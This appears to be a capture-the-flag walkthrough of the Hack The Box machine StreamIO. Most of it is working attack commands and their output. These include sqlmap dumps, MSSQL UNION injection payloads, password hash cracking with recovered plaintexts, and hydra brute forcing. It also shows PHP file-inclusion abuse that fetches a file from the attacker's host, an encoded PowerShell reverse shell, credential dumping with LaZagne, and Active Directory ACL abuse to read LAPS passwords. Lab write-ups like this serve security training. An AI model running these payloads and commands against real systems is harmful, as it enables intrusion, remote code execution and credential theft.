# User
## Web
Start with some Enum
#dirsearch
```sh
dirsearch -u http://streamio.htb/ 
```
To our own idiocy of not reading nmap output we find:
https://watch.streamio.htb/
Let's try again the right way. #ffuf 
```sh
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u https://streamio.htb -H "Host: FUZZ.streamio.htb" -fw 27
dirsearch -u https://watch.streamio.htb/
```
yields:
```
/search.php 
```
Inputting something into the searchbar gives us the post is made in the format going to search.php:
```
q:
```
So we try some sqlmap
```sh
sqlmap --dump-all -u "https://watch.streamio.htb/search.php" --data "q=somebullshit" -p "q" --random-agent
```
We get blocked, so we open it up in #burpsuite which yields:
![[Pasted image 20240522154003.png]]
This isn't working so let's pivot.
## LDAP is open
Well this doesn't yield anything using windapsearch so far.
## Web
OK Well, let's go back to just searching the site.  When I check the website again. At the URL, I find:
https://streamio.htb/login.php
Success! So let's register using burpsuite
```http
POST /register.php HTTP/2
Host: streamio.htb
Cookie: PHPSESSID=qp8ue175c8davsoc8icmobmnrn
Content-Length: 45
Cache-Control: max-age=0
Sec-Ch-Ua: "Not_A Brand";v="8", "Chromium";v="120"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Upgrade-Insecure-Requests: 1
Origin: https://streamio.htb
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://streamio.htb/register.php
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Priority: u=0, i
username=dis&password=bananas&confirm=bananas
```
Then let's login while using burp proxy
```http
POST /login.php HTTP/2
Host: streamio.htb
Cookie: PHPSESSID=qp8ue175c8davsoc8icmobmnrn
Content-Length: 29
Cache-Control: max-age=0
Sec-Ch-Ua: "Not_A Brand";v="8", "Chromium";v="120"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Upgrade-Insecure-Requests: 1
Origin: https://streamio.htb
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://streamio.htb/login.php
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Priority: u=0, i
username=dis&password=bananas
```
Login fails... Weird.
OK well, let's try some #sqlmap again (In hindsight, when doing this, I should NOT have done --dump-all)
[SQLMap - Cheetsheat | HackTricks | HackTricks](https://book.hacktricks.xyz/pentesting-web/sql-injection/sqlmap)
```sh
sqlmap --dump-all -u "https://streamio.htb/login.php" --data "username=dis&password=bananas" -p "username"
```
Success!!!
![[Pasted image 20240523101446.png]]
So we find 5 databases
```
[*] model
[*] msdb
[*] STREAMIO
[*] streamio_backup
[*] tempdb
```
Backups looks most interesting.
```sh
sqlmap --dump -D streamio_backup -u "https://streamio.htb/login.php" --data "username=dis&password=bananas" -p "username" -o 
```
that failed. let's do the same for STREAMIO, but dump the tables. This yields:
```
+--------+
| movies |
| users 
```
Next we need to dump the users table. with #sqlmap 
```sh
sqlmap -D STREAMIO -u "https://streamio.htb/login.php" --data "username=dis&password=bananas" -p "username" -o  --flush-session --no-cast -T users --dump
```
Jesus this takes forever..... Almost like. It can't handle the volume of the reqs being made or something. Am I unintentionally DOS'ing it?  
There are 30, but i'm impatient.
```
[5 entries]                                                                                                                                                                                                                                                                                                                 
+----+----------+----------------------------------------------------+----------------------------------------------------+                                                                                                                                                                                                 
| id | is_staff | password                                           | username                                           |                                                                                                                                                                                                 
+----+----------+----------------------------------------------------+----------------------------------------------------+                                                                                                                                                                                                 
|    |          | c660060492d9edcaa8332d89c99c9239                   | James                                              |                                                                                                                                                                                                 
|    |          | 925e5408ecb67aea449373d668b7359e                   | Theodore                                           |                                                                                                                                                                                                 
|    |          | 083ffae904143c4796e464dac33c1f7d                   | Samantha                                           |                                                                                                                                                                                                 
|    |          | 08344b85b329d7efd611b7a7743e8a09                   | Lauren                                             |                                                                                                                                                                                                 
|    |          | d62be0dc82071bccc1322d64ec5b6c51                   | William                                            |                                                                                                                                                                                                 
+----+----------+----------------------------------------------------+----------------------------------------------------+  
```
```
+----+----------+----------------------------------------------------+----------------------------------------------------+
| id | is_staff | password                                           | username                                           |
+----+----------+----------------------------------------------------+----------------------------------------------------+
|    |          | c660060492d9edcaa8332d89c99c9239                   | James                                              |
|    |          | 925e5408ecb67aea449373d668b7359e                   | Theodore                                           |
|    |          | 083ffae904143c4796e464dac33c1f7d                   | Samantha                                           |
|    |          | 08344b85b329d7efd611b7a7743e8a09                   | Lauren                                             |
|    |          | d62be0dc82071bccc1322d64ec5b6c51                   | William                                            |
|    |          | f87d3c0d6c8fd686aacc6627f1f493a5                   | }rrrqrq                                            |
|    |          | f0DbO@le[se07u\x7f|`?hǛd75pgnIba694                | }}}~\x7f}                                          |
| ?? |          | 4PYPlpmkhDv:4}9«b2?6=t:f4m8At5Ac                   | }trse                                              |
+----+----------+----------------------------------------------------+----------------------------------------------------+

```
SOOOOoooo long, let's go to watch.streamio.htb/search.php
Enumerate DB #mssql-injections
```sql
-1' UNION SELECT 1,name,3,4,5,6  FROM streamio..sysobjects WHERE xtype ='U';-- -
```
Enumerate Users columns
```sql
-1' UNION SELECT 1,name,3,4,5,6 FROM syscolumns WHERE id =(SELECT id FROM sysobjects WHERE name = 'users')-- -
```
Enumerate user and password columns
```sql
-1' UNION SELECT 1,CONCAT(username,':',password),3,4,5,6 FROM users-- -
```
Success!
```
admin :665a50ac9eaa781e4f7f04199db97a11
Alexendra :1c2b3d8270321140e5153f6637d3ee53
Austin :0049ac57646627b8d7aeaccf8b6a936f
Barbra :3961548825e3e21df5646cafe11c6c76
Barry :54c88b2dbd7b1a84012fabc1a4c73415
Baxter :22ee218331afd081b0dcd8115284bae3
Bruno :2a4e2cf22dd8fcb45adcb91be1e22ae8
Carmon :35394484d89fcfdb3c5e447fe749d213
Clara :ef8f3d30a856cf166fb8215aca93e9ff
Diablo :ec33265e5fc8c2f1b0c137bb7b3632b5
Garfield :8097cedd612cc37c29db152b6e9edbd3
Gloria :0cfaaaafb559f081df2befbe66686de0
James :c660060492d9edcaa8332d89c99c9239
Juliette :6dcd87740abb64edfa36d170f0d5450d
Lauren :08344b85b329d7efd611b7a7743e8a09
Lenord :ee0b8a0937abd60c2882eacb2f8dc49f
Lucifer :7df45a9e3de3863807c026ba48e55fb3
Michelle :b83439b16f844bd6ffe35c02fe21b3c0
Oliver :fd78db29173a5cf701bd69027cb9bf6b
Robert :f03b910e2bd0313a23fdd7575f34a694
Robin :dc332fb5576e9631c9dae83f194f8e70
Sabrina :f87d3c0d6c8fd686aacc6627f1f493a5
Samantha :083ffae904143c4796e464dac33c1f7d
Stan :384463526d288edcc95fc3701e523bc7
Thane :3577c47eb1e12c8ba021611e1280753c
Theodore :925e5408ecb67aea449373d668b7359e
Victor :bf55e15b119860a6e6b5a164377da719
Victoria :b22abb47a02b52d5dfa27fb0b534f693
William :d62be0dc82071bccc1322d64ec5b6c51
yoshihide :b779ba15cedfd22a023c4d8bcf5f2332
```
OK Let's crack the hashes with #hashcat 
```sh
hashcat users_hashes ~/Downloads/rockyou.txt -m 0
```
ok! we have the admin hash among others
```
3577c47eb1e12c8ba021611e1280753c:highschoolmusical        
ee0b8a0937abd60c2882eacb2f8dc49f:physics69i               
665a50ac9eaa781e4f7f04199db97a11:paddpadd                 
b779ba15cedfd22a023c4d8bcf5f2332:66boysandgirls..         
ef8f3d30a856cf166fb8215aca93e9ff:%$clara                  
2a4e2cf22dd8fcb45adcb91be1e22ae8:$monique$1991$           
54c88b2dbd7b1a84012fabc1a4c73415:$hadoW                   
6dcd87740abb64edfa36d170f0d5450d:$3xybitch                
08344b85b329d7efd611b7a7743e8a09:##123a8j8w5123##         
b83439b16f844bd6ffe35c02fe21b3c0:!?Love?!123              
b22abb47a02b52d5dfa27fb0b534f693:!5psycho8!               
f87d3c0d6c8fd686aacc6627f1f493a5:!!sabrina$
```
Let's pivot back to our login screen. Logging in with admin doesn't work.
if we wanted to use #hydra-login-post
```sh
hydra -L users -P passwords streamio.htb https-post-form "/login.php:username=^USER^&password=^PASS^:F=Login failed"
```
We get a hit with:
```
username: yoshihide
password: 66boysandgirls..
```
## Let's do LocalFile Inclusion 
#local-file-inclusion-php
First we need to get the session token we have from the cookie.
```
PHPSESSID:"2hmcgi9dd28ta62mcpfjqu1lcf"
```
#ffuf-LFI-fuzzing
```sh
ffuf -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -u https://streamio.htb/admin/index.php?message=FUZZ -b PHPSESSID=2hmcgi9dd28ta62mcpfjqu1lcf -fs 1678
```
Nothin so let's try #ffuf-web-content
```sh
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt -u https://streamio.htb/admin/index.php?FUZZ= -b PHPSESSID=2hmcgi9dd28ta62mcpfjqu1lcf -fs 1678
```
So we find debug. Let's retry the FFUF LFI
```sh
ffuf -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -u https://streamio.htb/admin/index.php?debug=FUZZ -b PHPSESSID=2hmcgi9dd28ta62mcpfjqu1lcf -fs 1712
```
success!
```
../../../../../../../../windows/win.ini
..\..\..\..\..\..\..\..\windows\win.ini
```
OK Let's see if we can read it with #php-local-file-inclusion-read
```
https://streamio.htb/admin/?debug=php://filter/convert.base64-encode/resource=../../../../../../../../windows/win.ini
```
Well this, decoded is useless
```
¢yr; for 16-bit app support
[fonts]
[extensions]
[mci extensions]
[files]
[Mail]
MAPI=1
```
```web
https://streamio.htb/admin/?debug=php://filter/convert.base64-encode/resource=master.php](https://streamio.htb/admin/?debug=php%3A%2F%2Ffilter%2Fconvert.base64-encode%2Fresource%3Dmaster.php)
```
this gives us
```
onlyPGgxPk1vdmllIG1hbmFnbWVudDwvaDE+DQo8P3BocA0KaWYoIWRlZmluZWQoJ2luY2x1ZGVkJykpDQoJZGllKCJPbmx5IGFjY2Vzc2FibGUgdGhyb3VnaCBpbmNsdWRlcyIpOw0KaWYoaXNzZXQoJF9QT1NUWydtb3ZpZV9pZCddKSkNCnsNCiRxdWVyeSA9ICJkZWxldGUgZnJvbSBtb3ZpZXMgd2hlcmUgaWQgPSAiLiRfUE9TVFsnbW92aWVfaWQnXTsNCiRyZXMgPSBzcWxzcnZfcXVlcnkoJGhhbmRsZSwgJHF1ZXJ5LCBhcnJheSgpLCBhcnJheSgiU2Nyb2xsYWJsZSI9PiJidWZmZXJlZCIpKTsNCn0NCiRxdWVyeSA9ICJzZWxlY3QgKiBmcm9tIG1vdmllcyBvcmRlciBieSBtb3ZpZSI7DQokcmVzID0gc3Fsc3J2X3F1ZXJ5KCRoYW5kbGUsICRxdWVyeSwgYXJyYXkoKSwgYXJyYXkoIlNjcm9sbGFibGUiPT4iYnVmZmVyZWQiKSk7DQp3aGlsZSgkcm93ID0gc3Fsc3J2X2ZldGNoX2FycmF5KCRyZXMsIFNRTFNSVl9GRVRDSF9BU1NPQykpDQp7DQo/Pg0KDQo8ZGl2Pg0KCTxkaXYgY2xhc3M9ImZvcm0tY29udHJvbCIgc3R5bGU9ImhlaWdodDogM3JlbTsiPg0KCQk8aDQgc3R5bGU9ImZsb2F0OmxlZnQ7Ij48P3BocCBlY2hvICRyb3dbJ21vdmllJ107ID8+PC9oND4NCgkJPGRpdiBzdHlsZT0iZmxvYXQ6cmlnaHQ7cGFkZGluZy1yaWdodDogMjVweDsiPg0KCQkJPGZvcm0gbWV0aG9kPSJQT1NUIiBhY3Rpb249Ij9tb3ZpZT0iPg0KCQkJCTxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9Im1vdmllX2lkIiB2YWx1ZT0iPD9waHAgZWNobyAkcm93WydpZCddOyA/PiI+DQoJCQkJPGlucHV0IHR5cGU9InN1Ym1pdCIgY2xhc3M9ImJ0biBidG4tc20gYnRuLXByaW1hcnkiIHZhbHVlPSJEZWxldGUiPg0KCQkJPC9mb3JtPg0KCQk8L2Rpdj4NCgk8L2Rpdj4NCjwvZGl2Pg0KPD9waHANCn0gIyB3aGlsZSBlbmQNCj8+DQo8YnI+PGhyPjxicj4NCjxoMT5TdGFmZiBtYW5hZ21lbnQ8L2gxPg0KPD9waHANCmlmKCFkZWZpbmVkKCdpbmNsdWRlZCcpKQ0KCWRpZSgiT25seSBhY2Nlc3NhYmxlIHRocm91Z2ggaW5jbHVkZXMiKTsNCiRxdWVyeSA9ICJzZWxlY3QgKiBmcm9tIHVzZXJzIHdoZXJlIGlzX3N0YWZmID0gMSAiOw0KJHJlcyA9IHNxbHNydl9xdWVyeSgkaGFuZGxlLCAkcXVlcnksIGFycmF5KCksIGFycmF5KCJTY3JvbGxhYmxlIj0+ImJ1ZmZlcmVkIikpOw0KaWYoaXNzZXQoJF9QT1NUWydzdGFmZl9pZCddKSkNCnsNCj8+DQo8ZGl2IGNsYXNzPSJhbGVydCBhbGVydC1zdWNjZXNzIj4gTWVzc2FnZSBzZW50IHRvIGFkbWluaXN0cmF0b3I8L2Rpdj4NCjw/cGhwDQp9DQokcXVlcnkgPSAic2VsZWN0ICogZnJvbSB1c2VycyB3aGVyZSBpc19zdGFmZiA9IDEiOw0KJHJlcyA9IHNxbHNydl9xdWVyeSgkaGFuZGxlLCAkcXVlcnksIGFycmF5KCksIGFycmF5KCJTY3JvbGxhYmxlIj0+ImJ1ZmZlcmVkIikpOw0Kd2hpbGUoJHJvdyA9IHNxbHNydl9mZXRjaF9hcnJheSgkcmVzLCBTUUxTUlZfRkVUQ0hfQVNTT0MpKQ0Kew0KPz4NCg0KPGRpdj4NCgk8ZGl2IGNsYXNzPSJmb3JtLWNvbnRyb2wiIHN0eWxlPSJoZWlnaHQ6IDNyZW07Ij4NCgkJPGg0IHN0eWxlPSJmbG9hdDpsZWZ0OyI+PD9waHAgZWNobyAkcm93Wyd1c2VybmFtZSddOyA/PjwvaDQ+DQoJCTxkaXYgc3R5bGU9ImZsb2F0OnJpZ2h0O3BhZGRpbmctcmlnaHQ6IDI1cHg7Ij4NCgkJCTxmb3JtIG1ldGhvZD0iUE9TVCI+DQoJCQkJPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0ic3RhZmZfaWQiIHZhbHVlPSI8P3BocCBlY2hvICRyb3dbJ2lkJ107ID8+Ij4NCgkJCQk8aW5wdXQgdHlwZT0ic3VibWl0IiBjbGFzcz0iYnRuIGJ0bi1zbSBidG4tcHJpbWFyeSIgdmFsdWU9IkRlbGV0ZSI+DQoJCQk8L2Zvcm0+DQoJCTwvZGl2Pg0KCTwvZGl2Pg0KPC9kaXY+DQo8P3BocA0KfSAjIHdoaWxlIGVuZA0KPz4NCjxicj48aHI+PGJyPg0KPGgxPlVzZXIgbWFuYWdtZW50PC9oMT4NCjw/cGhwDQppZighZGVmaW5lZCgnaW5jbHVkZWQnKSkNCglkaWUoIk9ubHkgYWNjZXNzYWJsZSB0aHJvdWdoIGluY2x1ZGVzIik7DQppZihpc3NldCgkX1BPU1RbJ3VzZXJfaWQnXSkpDQp7DQokcXVlcnkgPSAiZGVsZXRlIGZyb20gdXNlcnMgd2hlcmUgaXNfc3RhZmYgPSAwIGFuZCBpZCA9ICIuJF9QT1NUWyd1c2VyX2lkJ107DQokcmVzID0gc3Fsc3J2X3F1ZXJ5KCRoYW5kbGUsICRxdWVyeSwgYXJyYXkoKSwgYXJyYXkoIlNjcm9sbGFibGUiPT4iYnVmZmVyZWQiKSk7DQp9DQokcXVlcnkgPSAic2VsZWN0ICogZnJvbSB1c2VycyB3aGVyZSBpc19zdGFmZiA9IDAiOw0KJHJlcyA9IHNxbHNydl9xdWVyeSgkaGFuZGxlLCAkcXVlcnksIGFycmF5KCksIGFycmF5KCJTY3JvbGxhYmxlIj0+ImJ1ZmZlcmVkIikpOw0Kd2hpbGUoJHJvdyA9IHNxbHNydl9mZXRjaF9hcnJheSgkcmVzLCBTUUxTUlZfRkVUQ0hfQVNTT0MpKQ0Kew0KPz4NCg0KPGRpdj4NCgk8ZGl2IGNsYXNzPSJmb3JtLWNvbnRyb2wiIHN0eWxlPSJoZWlnaHQ6IDNyZW07Ij4NCgkJPGg0IHN0eWxlPSJmbG9hdDpsZWZ0OyI+PD9waHAgZWNobyAkcm93Wyd1c2VybmFtZSddOyA/PjwvaDQ+DQoJCTxkaXYgc3R5bGU9ImZsb2F0OnJpZ2h0O3BhZGRpbmctcmlnaHQ6IDI1cHg7Ij4NCgkJCTxmb3JtIG1ldGhvZD0iUE9TVCI+DQoJCQkJPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0idXNlcl9pZCIgdmFsdWU9Ijw/cGhwIGVjaG8gJHJvd1snaWQnXTsgPz4iPg0KCQkJCTxpbnB1dCB0eXBlPSJzdWJtaXQiIGNsYXNzPSJidG4gYnRuLXNtIGJ0bi1wcmltYXJ5IiB2YWx1ZT0iRGVsZXRlIj4NCgkJCTwvZm9ybT4NCgkJPC9kaXY+DQoJPC9kaXY+DQo8L2Rpdj4NCjw/cGhwDQp9ICMgd2hpbGUgZW5kDQo/Pg0KPGJyPjxocj48YnI+DQo8Zm9ybSBtZXRob2Q9IlBPU1QiPg0KPGlucHV0IG5hbWU9ImluY2x1ZGUiIGhpZGRlbj4NCjwvZm9ybT4NCjw/cGhwDQppZihpc3NldCgkX1BPU1RbJ2luY2x1ZGUnXSkpDQp7DQppZigkX1BPU1RbJ2luY2x1ZGUnXSAhPT0gImluZGV4LnBocCIgKSANCmV2YWwoZmlsZV9nZXRfY29udGVudHMoJF9QT1NUWydpbmNsdWRlJ10pKTsNCmVsc2UNCmVjaG8oIiAtLS0tIEVSUk9SIC0tLS0gIik7DQp9DQo/Pg== 
```
So we look at the files right **what** is being included is very important. From this we find:
```php
if($_POST['include'] !== "index.php" ) 
eval(file_get_contents($_POST['include']));
else
```
This also says you can get it to get the contents from our own bullshit by posting to it the right way with curl.
Also we found creds
```php
$connection = array("Database"=>"STREAMIO", "UID" => "db_admin", "PWD" => 'B1@hx31234567890');

```
#curl-post-lfi
#php-local-file-inclusion 
First we make a file containing 
```php
system($_GET['cmd']);
```
Now for the curl.
```sh
curl -X POST 'https://streamio.htb/admin/?debug=master.php&cmd=dir' -k -b 'PHPSESSID=2hmcgi9dd28ta62mcpfjqu1lcf' -d 'include=http://10.10.14.5:8000/phprevshell.php
```
```
PHPSESSID:"2hmcgi9dd28ta62mcpfjqu1lcf"
```
OK So let's change up our revshell. #php-reverse-shell
```php
system('powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4ANQAiACwAOAAwADAAOAApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=');
```
And hooray! We have a shell. finally.
Remember those creds earlier? And how we know we have the streamio_backup db we can't read from, and the other stuff.
## MSSQLCMD
Let's target it #mssql-sqlcmd #sqlcmd 

```powershell
sqlcmd -H localhost -U db_admin -P 'B1@hx31234567890' -Q 'select table_name from master.dbo.sysdatabase'
```
let's enum this table of import.
```powershell
sqlcmd -H localhost -U db_admin -P 'B1@hx31234567890' -Q 'select table_name from streamio_backup.information_schema.tables'
```
We find the same column from before. Let's dump everything from it.
```powershell
sqlcmd -H localhost -U db_admin -P 'B1@hx31234567890' -Q 'USE streamio_backup; select * from users'
```
Cool even more creds.
```
          1 nikk37                                             389d14cb8e4e9b94b137deb1caf0612a                  
          2 yoshihide                                          b779ba15cedfd22a023c4d8bcf5f2332                  
          3 James                                              c660060492d9edcaa8332d89c99c9239                  
          4 Theodore                                           925e5408ecb67aea449373d668b7359e                  
          5 Samantha                                           083ffae904143c4796e464dac33c1f7d                  
          6 Lauren                                             08344b85b329d7efd611b7a7743e8a09                  
          7 William                                            d62be0dc82071bccc1322d64ec5b6c51                  
          8 Sabrina                                            f87d3c0d6c8fd686aacc6627f1f493a5 
```
Cracking the nikk37 one we get:
```
get_dem_girls2@yahoo.com 
```
Now NMAP tells us that SMB is open, let's try to access w/ winrm.
```sh
evil-winrm -u nikk37 -p get_dem_girls2@yahoo.com -i streamio.htb
```
Yay we can get the flag from the desktop from here.
# Root
We try to upload #printspoofer but it fails because we lack the seImpersonatePrivilege privilege.
Let's maybe try to get creds w/ #LaZagne
```
https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.5/LaZagne.exe
```

```winrm
upload LaZagne.exe
C:\Users\nikk37\Documents\LaZagne.exe all
```
Wow creds.

```
Login: admin
Password: JDg0dd1s@d0p3cr3@t0r
```
Trying to login with this doesn't work as admin. but let's try JDG0dd?
It still doesn't work.
Let's try #powerview 
```powershell
upload /home/kali/Downloads/PowerView.ps1
Import-Module .\PowerView.ps1
$pass = ConvertTo-SecureString 'JDg0dd1s@d0p3cr3@t0r' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('streamio.htb\JDgodd', $pass)
Add-DomainObjectAcl -Credential $cred -TargetIdentity "Core Staff" -PrincipalIdentity "streamio\JDgodd"
Add-DomainGroupMember -Credential $cred -Identity "Core Staff" -Members "StreamIO\JDgodd"
```
According to bloodhound this can read laps passwords #LAPS
```
Get-AdComputer -Filter * -Properties ms-Mcs-AdmPwd -Credential $cred
```
Then we get the root flag.